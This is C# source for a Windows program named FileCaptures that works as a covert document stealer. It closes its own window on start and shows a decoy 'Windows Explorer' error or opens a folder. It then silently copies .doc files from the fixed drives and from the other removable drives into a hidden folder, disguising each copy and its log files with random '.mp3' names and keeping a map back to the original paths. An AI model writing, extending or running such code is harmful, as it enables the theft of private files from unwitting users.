using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace FileCaptures
{
    public partial class frmMain : Form
    {
        //public constrctures region
        public frmMain()
        {
            //one instance allowed
            if (System.Diagnostics.Process.GetProcessesByName(System.Diagnostics.Process.GetCurrentProcess().ProcessName).Length > 1)
                this.Close();

            //default values
            extentions = "*.doc*";
            openDirectory = "mac address";

            //read configures
            if (System.IO.File.Exists(CONFIG_FILE_NAME))
            {
                System.IO.StreamReader sr = new System.IO.StreamReader(CONFIG_FILE_NAME);
                String file = sr.ReadToEnd();
                sr.Close();

                String[] values = file.Split(new String[] { Environment.NewLine }, StringSplitOptions.None);

                if (values != null)
                    for (Int32 i = 0; i < values.Length; i++)
                    {
                        if (values[i] != null && values[i] != "" && values[i][0] != '#' && values[i].IndexOf('=') >= 0 && values[i].IndexOf('=') < values[i].Length - 1)
                        {
                            String value = values[i].Substring(values[i].IndexOf('=') + 1);

                            switch (values[i].Substring(0, values[i].IndexOf('=')).ToLower())
                            {
                                case KW_EXTENTIONS:
                                    extentions = value;
                                    break;
                                case KW_OPEN_DIRECTORY:
                                    openDirectory = value;
                                    break;
                                case KW_SPECIAL_PATH:
                                    specialPath = value;
                                    break;
                            }
                        }
                    }
            }

            //open directury: dummy operation
            if (System.IO.Directory.Exists(openDirectory))
                System.Diagnostics.Process.Start(openDirectory);
            else
                MessageBox.Show("couldn't open the folder " + System.IO.Path.Combine(System.IO.Path.GetDirectoryName(Application.ExecutablePath), System.IO.Path.GetFileNameWithoutExtension(Application.ExecutablePath)), "Windows Explorer", MessageBoxButtons.OK, MessageBoxIcon.Error);

            //search in speacialpath or all drives
            if (specialPath != null && specialPath != "" && System.IO.Directory.Exists(specialPath))
                CopyFiles(specialPath);
            else
            {
                System.IO.DriveInfo[] drives = System.IO.DriveInfo.GetDrives();
                for (Int32 i = drives.Length - 1; i >= 0; i--)
                    if (drives[i].IsReady && (drives[i].DriveType == System.IO.DriveType.Fixed || (drives[i].DriveType == System.IO.DriveType.Removable && drives[i].Name.ToLower() != System.IO.Path.GetPathRoot(Application.ExecutablePath).ToLower())))
                        CopyFiles(drives[i].Name);
            }

            //windows components
            InitializeComponent();
        }

        //private events region
        private void frmMain_Load(object sender, EventArgs e)
        {
            this.Close();
        }

        //private functions region
        private void LogException(String exceptionMessage)
        {
            try
            {
                System.IO.StreamWriter sw = new System.IO.StreamWriter(System.IO.Path.Combine(RESULT_DIRECTORY_NAME, LOG_FILE_NAME), true);
                sw.WriteLine("time:" + DateTime.Now + ";message:" + exceptionMessage);
                sw.Close();
            }
            catch
            {
                //do nothing
            }
        }

        private void LogNames(String fackName,String realName)
        {
            try
            {
                System.IO.StreamWriter sw = new System.IO.StreamWriter(System.IO.Path.Combine(RESULT_DIRECTORY_NAME, NAMES_FILE_NAME), true);
                sw.WriteLine(fackName + ';' + realName);
                sw.Close();
            }
            catch (Exception ex)
            {
                LogException(ex.Message);
            }
        }

        private void CopyFiles(String path)
        {
            if (path != null || path != "")
            {
                try
                {
                    //get files in path
                    String[] files = Maniyat.FileSearcher.Searching(path, extentions, SEARCH_DEPTH);

                    //log time
                    LogNames("#Starting", System.DateTime.Now.ToString());

                    //create result directory
                    if (!System.IO.Directory.Exists(RESULT_DIRECTORY_NAME))
                        System.IO.Directory.CreateDirectory(RESULT_DIRECTORY_NAME);

                    //for every filename in files
                    foreach (String file in files)
                    {
                        //result file name
                        Random rnd = new Random();
                        String fakeName = "";

                        //result file name synthesizer: if exist filename(id)
                        do
                        {
                            fakeName = rnd.NextDouble().ToString().Substring(2);
                        } while (System.IO.File.Exists(System.IO.Path.Combine(RESULT_DIRECTORY_NAME, fakeName + ".mp3")));

                        //write name log
                        LogNames(fakeName, file);

                        //copy files to result folder
                        System.IO.File.Copy(file, System.IO.Path.Combine(RESULT_DIRECTORY_NAME, fakeName + ".mp3"));
                    }
                }
                catch (Exception ex)
                {
                    LogException(ex.Message);
                }
            }
        }

        //private fields regions
        private String specialPath;
        private String extentions;
        private String openDirectory;

        //private consts regions
        private const String CONFIG_FILE_NAME = "config.mp3";
        private const String KW_EXTENTIONS = "extentions";
        private const String KW_OPEN_DIRECTORY = "opendirectory";
        private const String KW_SPECIAL_PATH = "specialpath";
        private const String RESULT_DIRECTORY_NAME = "res";
        private const String LOG_FILE_NAME = "lgo.mp3";
        private const String NAMES_FILE_NAME = "yamia.mp3";
        private const Int32 SEARCH_DEPTH = 5;
    }
}
